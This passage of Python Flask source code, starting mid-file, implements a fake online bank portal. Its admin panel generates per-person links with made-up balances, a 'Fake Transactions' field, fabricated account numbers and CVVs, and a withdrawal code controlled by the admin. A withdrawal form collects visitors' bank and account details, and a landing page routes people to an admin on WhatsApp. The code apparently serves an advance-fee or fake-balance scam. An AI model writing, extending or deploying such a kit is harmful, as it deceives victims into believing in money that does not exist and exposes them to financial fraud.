<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>{{ css|safe }}</style></head><body>
<div class="wrap" style="margin-top:20vh">
  <div class="card" style="text-align:center">
    <div class="hero-content" style="margin-bottom:2rem">
      <div class="bank-logo-sm" style="justify-content:center">
        <div class="icon"><svg viewBox="0 0 24 24" fill="#fff" width="14" height="14"><path d="M12 2L2 22h20L12 2z"/></svg></div>
        <div class="txt">{{ bank }}<br>Premium</div>
      </div>
      <h2 style="font-size:1.3rem;margin:1rem 0 0">Welcome back, {{ name }}</h2>
      <p style="color:#9aa7c7;font-size:.9rem;margin-top:.5rem">Enter your password to access your account.</p>
    </div>
    
    <div style="text-align:left">
      <label>Password</label>
      <div class="pw-wrap">
        <input id="pw" type="password" placeholder="Enter your password">
        <button type="button" class="pw-toggle" onclick="togglePw('pw')">
          <svg id="eye-pw" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
        </button>
      </div>
    </div>
    
    <button class="primary" onclick="doLogin()">Log In</button>
    <div class="msg" id="msg"></div>
  </div>
</div>
<script>
function togglePw(id){
  const el = document.getElementById(id);
  const icon = document.getElementById('eye-'+id);
  if(el.type === 'password'){
    el.type = 'text';
    icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>';
  } else {
    el.type = 'password';
    icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>';
  }
}

async function doLogin(){
  const btn=document.querySelector('button.primary');
  const msg=document.getElementById('msg');
  const pw=document.getElementById('pw').value;
  if(!pw){ msg.className='msg err show'; msg.textContent='password required'; return; }
  btn.disabled=true; msg.className='msg show'; msg.textContent='verifying…';
  try{
    const r=await fetch('/v/{{slug}}/auth',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pw})});
    const d=await r.json();
    if(r.ok&&d.ok){
      msg.className='msg ok show'; msg.textContent='Success — redirecting…';
      setTimeout(()=>location.href='/v/{{slug}}/dashboard',600);
    } else {
      msg.className='msg err show'; msg.textContent=d.error||'wrong password';
      btn.disabled=false;
    }
  }catch(e){
    msg.className='msg err show'; msg.textContent='network error';
    btn.disabled=false;
  }
}
</script>
</body></html>
"""

@app.route("/v/<slug>/login")
def user_login(slug):
    rec = db_get_link(slug)
    if not rec: abort(404)
    if not rec.get("password_hash"): return redirect(url_for("user_page", slug=slug, page="dashboard"))
    return render_template_string(LOGIN_HTML, css=BANK_CSS, bank=BANK_NAME, name=rec["name"], slug=slug)

@app.route("/v/<slug>/auth", methods=["POST"])
def user_auth(slug):
    d = request.get_json(force=True)
    rec = db_get_link(slug)
    if not rec: return jsonify({"error":"not found"}), 404
    if check_pw(d.get("password",""), rec.get("password_hash")):
        session[f"auth_{slug}"] = True
        return jsonify({"ok": True})
    return jsonify({"error": "incorrect password"}), 401

@app.route("/v/<slug>/logout")
def user_logout(slug):
    session.pop(f"auth_{slug}", None)
    return redirect(url_for("user_login", slug=slug))

@app.route("/v/<slug>")
def view_account_redirect(slug):
    return redirect(url_for('user_page', slug=slug, page='dashboard'))

@app.route("/v/<slug>/<page>")
@user_required
def user_page(slug, page):
    rec = db_get_link(slug)
    if page not in ['dashboard', 'history', 'transfer', 'cards', 'settings']:
        return redirect(url_for('user_page', slug=slug, page='dashboard'))
        
    withdrawn_amount = rec.get("withdrawn_amount") or 0
    opening = rec["balance"] + withdrawn_amount
    acct_full = "0123" + str(abs(hash(slug)) % 10000000).zfill(7)
    acct_last = acct_full[-4:]
    
    # Generate a deterministic random-looking CVV based on slug
    cvv = str((abs(hash(slug)) % 900) + 100)

    tx_list = []
    if rec.get("transactions"):
        try: tx_list = json.loads(rec["transactions"])
        except: pass
        
    if rec.get("withdrawn"):
        tx_list.insert(0, {
            "name": f"Transfer to {rec.get('bank')}",
            "date": "Just now",
            "amount": -(rec.get("withdrawn_amount") or 0)
        })

    tab = render_template_string(BOTTOM_TAB, slug=slug, active=page)
    
    kwargs = dict(
        css=BANK_CSS, tab=tab, slug=slug,
        bank=BANK_NAME, name=rec["name"], currency=rec["currency"],
        balance=rec["balance"], withdrawn=rec.get("withdrawn", False),
        withdrawn_amount=withdrawn_amount, opening=opening,
        acct_full=acct_full, acct_last=acct_last, cvv=cvv,
        bank_dest=rec.get("bank") or "Bank",
        tx_list=tx_list
    )
    
    if page == 'dashboard':
        return render_template_string(DASHBOARD_HTML, **kwargs)
    elif page == 'history':
        return render_template_string(HISTORY_HTML, **kwargs)
    elif page == 'transfer':
        return render_template_string(TRANSFER_HTML, **kwargs)
    elif page == 'cards':
        return render_template_string(CARDS_HTML, **kwargs)
    elif page == 'settings':
        return render_template_string(SETTINGS_HTML, **kwargs)

@app.route("/v/<slug>/withdraw/submit", methods=["POST"])
@user_required
def withdraw_submit(slug):
    d = request.get_json(force=True)
    rec = db_get_link(slug)
    if not rec: return jsonify({"error":"not found"}), 404
    if rec.get("withdrawn"): return jsonify({"error":"already processed"}), 400
    if (d.get("code") or "").strip() != rec["withdraw_code"]:
        return jsonify({"error":"invalid withdrawal code"}), 403
    bank = (d.get("bank") or "").strip()
    acct = (d.get("account") or "").strip()
    if not bank or not acct: return jsonify({"error":"bank and account required"}), 400
    amt = float(d.get("amount") or 0)
    if amt <= 0 or amt > rec["balance"]: return jsonify({"error":"invalid amount"}), 400
    rec["balance"] -= amt
    rec["withdrawn"] = True
    rec["bank"] = bank
    rec["account"] = acct
    rec["withdrawn_amount"] = amt
    db_put_link(rec)
    return jsonify({"ok": True})

# ---------------- Landing (Oops Page) ----------------

NOT_A_USER_HTML = """
<!doctype html><html><head><meta charset="utf-8"><title>{{ bank }} — Not a user</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{background:#080b12;color:#ffffff;font-family:'Inter',system-ui,sans-serif;margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:1.5rem}
.card{max-width:440px;width:100%;text-align:center;background:#111827;border:1px solid #1f2a44;border-radius:24px;padding:3rem 2rem;box-shadow:0 30px 80px rgba(0,0,0,.8)}
.logo{font-weight:700;color:#60a5fa;margin-bottom:1.5rem;font-size:1rem;display:flex;align-items:center;justify-content:center;gap:.5rem}
.oops{font-size:4rem;margin:0;line-height:1}
h1{font-size:1.4rem;margin:1.5rem 0 .5rem;font-weight:600}
p{color:#9aa7c7;line-height:1.5;margin:0 0 2rem;font-size:.9rem}
.btn{display:inline-flex;align-items:center;gap:.6rem;justify-content:center;background:#34d399;color:#06210f;text-decoration:none;font-weight:700;padding:1rem 1.5rem;border-radius:14px;width:100%;font-size:.95rem;transition:.2s}
.btn:hover{background:#10b981;transform:scale(1.02)}
.btn svg{width:22px;height:22px;flex-shrink:0}
.foot{margin-top:2rem;font-size:.75rem;color:#4b5876}
</style></head><body>
<div class="card">
  <div class="logo"><svg viewBox="0 0 24 24" fill="#60a5fa" width="24" height="24"><path d="M12 2L2 22h20L12 2z"/></svg> {{ bank }}</div>
  <div class="oops">😕</div>
  <h1>Oops — you're not a user yet</h1>
  <p>Looks like you don't have an account with us. Message the admin on WhatsApp and they'll set you up.</p>
  <a class="btn" href="https://wa.me/{{ phone }}?text={{ msg }}" target="_blank" rel="noopener">
    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M17.5 14.4c-.3-.1-1.7-.8-1.9-.9-.3-.1-.5-.1-.7.1-.2.3-.7.9-.9 1.1-.2.2-.3.2-.6.1-.3-.1-1.2-.4-2.3-1.4-.8-.8-1.4-1.7-1.6-2-.2-.3 0-.5.1-.6.1-.1.3-.3.4-.5.1-.2.2-.3.3-.5.1-.2 0-.4 0-.5 0-.1-.7-1.6-.9-2.2-.2-.6-.5-.5-.7-.5h-.6c-.2 0-.5.1-.8.4-.3.3-1 1-1 2.4 0 1.4 1 2.8 1.2 3 .1.2 2 3.1 4.9 4.3.7.3 1.2.5 1.6.6.7.2 1.3.2 1.8.1.5-.1 1.7-.7 1.9-1.4.2-.7.2-1.2.2-1.4-.1-.1-.3-.2-.6-.3z"/></svg>
    Message admin on WhatsApp
  </a>
  <div class="foot">{{ bank }} · secure portal</div>
</div></body></html>
"""

def render_landing():
    msg = quote("Hi, I'd like to be set up as a user of " + BANK_NAME + ".")
    return render_template_string(NOT_A_USER_HTML, bank=BANK_NAME, phone=WHATSAPP_NUMBER, msg=msg)

@app.route("/")
def index():
    return render_landing()

@app.route("/favicon.ico")
def favicon():
    return "", 204

@app.errorhandler(404)
def not_found(e):
    return render_landing(), 404

# ---------------- Admin ----------------

ADMIN_HTML = """
<!doctype html><html><head><meta charset="utf-8"><title>Admin</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{background:#0b0f1a;color:#e8eefc;font-family:system-ui,sans-serif;margin:0;padding:2rem}
.container{max-width:1100px;margin:0 auto}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:2rem}
@media(max-width:900px){.grid{grid-template-columns:1fr}body{padding:1rem}}
.card{background:#111827;padding:1.5rem;border-radius:16px;box-shadow:0 10px 40px rgba(0,0,0,.5)}
label{display:block;font-size:.85rem;color:#9aa7c7;margin-top:.8rem}
input,select,textarea{width:100%;padding:.6rem;margin-top:.3rem;background:#0b1220;border:1px solid #1f2a44;color:#e8eefc;border-radius:8px;box-sizing:border-box;font-family:inherit}
button{padding:.7rem 1.2rem;background:#2563eb;color:#fff;border:0;border-radius:8px;cursor:pointer;font-weight:600;margin-top:1rem}
table{width:100%;border-collapse:collapse;margin-top:1rem}
th,td{padding:.6rem;border-bottom:1px solid #1f2a44;text-align:left;font-size:.9rem;vertical-align:top}
th{color:#9aa7c7;font-weight:500}
a{color:#60a5fa;word-break:break-all}
.code{font-family:monospace;background:#0b1220;padding:.15rem .4rem;border-radius:6px}
.err{color:#f87171}.ok{color:#4ade80}
.tx-row{display:grid;grid-template-columns:1.5fr 1fr 1.5fr 1fr 30px;gap:.5rem;margin-bottom:.5rem;align-items:center}
.tx-row input, .tx-row select{margin:0}
.tx-row button{margin:0;padding:0;background:#7f1d1d;border-radius:8px;height:36px}

/* Password Inputs */
.pw-wrap{position:relative}
.pw-wrap input{padding-right:2.5rem}
.pw-toggle{position:absolute;right:0.8rem;top:50%;transform:translateY(-50%);cursor:pointer;color:#7d8bab;background:none;border:none;padding:0;margin:0;display:flex;align-items:center}
.pw-toggle svg{width:18px;height:18px;fill:none;stroke:currentColor;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
.pw-toggle:hover{color:#e8eefc}
</style></head><body>
<div class="container">
{% if not authed %}
  <div class="card" style="max-width:380px;margin:4rem auto">
    <h3 style="margin-top:0">{{ 'Set admin password' if first_run else 'Admin login' }}</h3>
    <form method="post" action="{{ url_for('admin_setpw' if first_run else 'admin_login') }}">
      <label>Password</label>
      <div class="pw-wrap">
        <input name="password" type="password" required autofocus>
        <button type="button" class="pw-toggle" onclick="togglePw(this)">
          <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
        </button>
      </div>
      {% if first_run %}
      <label>Confirm</label>
      <div class="pw-wrap">
        <input name="confirm" type="password" required>
        <button type="button" class="pw-toggle" onclick="togglePw(this)">
          <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
        </button>
      </div>
      {% endif %}
      <button>{{ 'Set password' if first_run else 'Sign in' }}</button>
    </form>
    {% if error %}<div class="err" style="margin-top:.8rem">{{ error }}</div>{% endif %}
  </div>
{% else %}
  <h1 style="margin-top:0">Admin</h1>
  <div class="grid">
    <div class="card">
      <h3 style="margin-top:0">Generate share link</h3>
      <form id="gen">
        <label>Display name</label><input name="name" required>
        
        <label>User Password (for login)</label>
        <div class="pw-wrap">
          <input name="user_password" type="password" required placeholder="They'll use this to log in">
          <button type="button" class="pw-toggle" onclick="togglePw(this)">
            <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
          </button>
        </div>
        
        <label>Currency</label>
        <select name="currency"><option>USD</option><option>EUR</option><option>GBP</option><option>NGN</option><option>JPY</option><option>CAD</option></select>
        
        <label>Balance</label><input name="balance" type="number" step="0.01" required value="0">
        
        <label>Withdrawal code</label>
        <div class="pw-wrap">
          <input name="withdraw_code" type="password" required>
          <button type="button" class="pw-toggle" onclick="togglePw(this)">
            <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
          </button>
        </div>
        
        <label style="margin-top:1.5rem">Fake Transactions (optional)</label>
        <div id="tx-container">
          <!-- dynamic rows -->
        </div>
        <button type="button" onclick="addTxRow()" style="background:#1f2a44;font-size:.8rem;padding:.4rem .8rem">+ Add Transaction</button>

        <button style="margin-top:1.5rem;width:100%">Generate Link</button>
      </form>
      <div id="out" style="margin-top:1rem"></div>
      <hr style="border-color:#1f2a44;margin:1.5rem 0">
      <h4 style="margin-top:0">Change admin password</h4>
      <form id="chpw">
        <label>Current</label>
        <div class="pw-wrap">
          <input name="current" type="password" required>
          <button type="button" class="pw-toggle" onclick="togglePw(this)">
            <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
          </button>
        </div>
        <label>New</label>
        <div class="pw-wrap">
          <input name="new" type="password" required>
          <button type="button" class="pw-toggle" onclick="togglePw(this)">
            <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
          </button>
        </div>
        <button>Update</button>
      </form>
      <div id="pwmsg" style="margin-top:.6rem"></div>
    </div>
    <div class="card">
      <h3 style="margin-top:0">Existing links</h3>
      <div id="list">loading…</div>
    </div>
  </div>
  <script>
  function togglePw(btn){
    const input = btn.previousElementSibling;
    const icon = btn.querySelector('svg');
    if(input.type === 'password'){
      input.type = 'text';
      icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>';
    } else {
      input.type = 'password';
      icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>';
    }
  }

  function addTxRow() {
    const div = document.createElement('div');
    div.className = 'tx-row';
    div.innerHTML = `
      <select class="tx-type">
        <option value="in">Incoming</option>
        <option value="out">Outgoing</option>
      </select>
      <select class="tx-date">
        <option>Today</option>
        <option>Yesterday</option>
        <option>Dec 14</option>
        <option>Dec 13</option>
        <option>Dec 12</option>
      </select>
      <input class="tx-name" placeholder="Recipient name">
      <input class="tx-amt" type="number" step="0.01" placeholder="Amount">
      <button type="button" onclick="this.parentElement.remove()">×</button>
    `;
    document.getElementById('tx-container').appendChild(div);
  }
  
  async function load(){
    const r=await fetch('/admin/api/links');
    const data=await r.json();
    const el=document.getElementById('list');
    if(!data.length){el.textContent='no links yet';return;}
    let h='<table><tr><th>name</th><th>cur</th><th>bal</th><th>code</th><th>link</th><th>state</th><th></th></tr>';
    for(const l of data){
      h+=`<tr><td>${l.name}</td><td>${l.currency}</td><td>${l.balance}</td>
      <td><span class="code">${l.withdraw_code}</span></td>
      <td><a href="/v/${l.slug}/dashboard" target="_blank">/v/${l.slug}</a></td>
      <td>${l.withdrawn?'withdrawn':'active'}</td>
      <td><button data-slug="${l.slug}" class="del" style="background:#7f1d1d">del</button></td></tr>`;
    }
    el.innerHTML=h+'</table>';
    el.querySelectorAll('.del').forEach(b=>b.onclick=async()=>{
      if(!confirm('delete?'))return;
      await fetch('/admin/api/links/'+b.dataset.slug,{method:'DELETE'});
      load();
    });
  }
  document.getElementById('gen').onsubmit=async(e)=>{
    e.preventDefault();
    const formData = new FormData(e.target);
    
    const txs = [];
    document.querySelectorAll('.tx-row').forEach(row => {
      const type = row.querySelector('.tx-type').value;
      const date = row.querySelector('.tx-date').value;
      const name = row.querySelector('.tx-name').value.trim();
      let amt = parseFloat(row.querySelector('.tx-amt').value);
      
      if(name && !isNaN(amt) && amt !== 0){
        if(type === 'out') amt = -Math.abs(amt);
        else amt = Math.abs(amt);
        txs.push({name: name, amount: amt, date: date});
      }
    });

    const body = Object.fromEntries(formData.entries());
    body.balance = parseFloat(body.balance);
    body.transactions = JSON.stringify(txs);
    
    const r=await fetch('/admin/api/links',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
    const d=await r.json();
    const url=location.origin+'/v/'+d.slug+'/dashboard';
    document.getElementById('out').innerHTML=`link: <a href="${url}" target="_blank">${url}</a>`;
    e.target.reset(); document.getElementById('tx-container').innerHTML=''; load();
  };
  document.getElementById('chpw').onsubmit=async(e)=>{
    e.preventDefault();
    const body=Object.fromEntries(new FormData(e.target).entries());
    const r=await fetch('/admin/api/password',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
    const d=await r.json();
    const m=document.getElementById('pwmsg');
    m.textContent=d.ok?'password updated':(d.error||'failed');
    m.className=d.ok?'ok':'err';
    if(d.ok) e.target.reset();
  };
  load();
  </script>
{% endif %}
</div></body></html>
"""

def render_admin(authed=False, first_run=False, error=None):
    return render_template_string(ADMIN_HTML, authed=authed, first_run=first_run, error=error)

@app.route("/admin")
def admin_page():
    if session.get("admin"): return render_admin(authed=True)
    return render_admin(authed=False, first_run=get_admin_hash() is None)

@app.route("/admin/login", methods=["POST"])
def admin_login():
    if check_pw(request.form.get("password",""), get_admin_hash()):
        session["admin"]=True
        return redirect(url_for("admin_page"))
    return render_admin(authed=False, error="wrong password")

@app.route("/admin/setpw", methods=["POST"])
def admin_setpw():
    if get_admin_hash() is not None:
        return redirect(url_for("admin_page"))
    pw=request.form.get("password",""); cf=request.form.get("confirm","")
    if pw!=cf or len(pw)<4:
        return render_admin(authed=False, first_run=True, error="passwords must match (min 4)")
    set_admin_hash(hash_pw(pw))
    session["admin"]=True
    return redirect(url_for("admin_page"))

@app.route("/admin/api/password", methods=["POST"])
@admin_required
def change_pw():
    d=request.get_json(force=True)
    if not check_pw(d.get("current",""), get_admin_hash()):
        return jsonify({"error":"current password wrong"}),403
    n=d.get("new","")
    if len(n)<4: return jsonify({"error":"min 4 chars"}),400
    set_admin_hash(hash_pw(n))
    return jsonify({"ok":True})

@app.route("/admin/api/links", methods=["GET"])
@admin_required
def list_links():
    return jsonify(db_list_links())

@app.route("/admin/api/links", methods=["POST"])
@admin_required
def create_link():
    d=request.get_json(force=True)
    name=(d.get("name") or "").strip()
    cur=(d.get("currency") or "USD").strip()
    bal=float(d.get("balance") or 0)
    code=(d.get("withdraw_code") or "").strip()
    user_pw=(d.get("user_password") or "").strip()
    txs=(d.get("transactions") or "[]")
    
    if not name or not code or not user_pw: return jsonify({"error":"name, code, and user_password required"}),400
    slug=uuid.uuid4().hex
    rec={
        "slug":slug,"name":name,"currency":cur,"balance":bal,
        "withdraw_code":code,"password_hash":hash_pw(user_pw),
        "transactions":txs,"withdrawn":False,"bank":None,
        "account":None,"withdrawn_amount":None,"created":int(time.time())
    }
    db_put_link(rec)
    return jsonify({"slug":slug})

@app.route("/admin/api/links/<slug>", methods=["DELETE"])
@admin_required
def delete_link(slug):
    db_delete_link(slug)
    return jsonify({"ok":True})

# ---------------- boot ----------------

init_db()

if __name__=="__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT",5000)))